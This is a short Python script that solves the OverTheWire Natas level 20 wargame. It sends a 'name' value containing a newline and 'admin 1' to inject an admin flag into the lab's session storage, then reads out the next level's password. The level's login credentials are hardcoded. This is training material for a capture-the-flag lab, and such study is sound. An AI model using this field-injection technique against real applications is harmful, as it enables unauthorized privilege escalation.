import requests, re

CREDS = ("natas20", "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH")
URL = "http://natas20.natas.labs.overthewire.org/index.php?debug=1"

s = requests.Session()
r = s.post(URL, auth=CREDS, data={'name': 'yes\nadmin 1'})
print(re.search("Password: [^ <]+", s.get(URL, auth=CREDS).text).group(0))
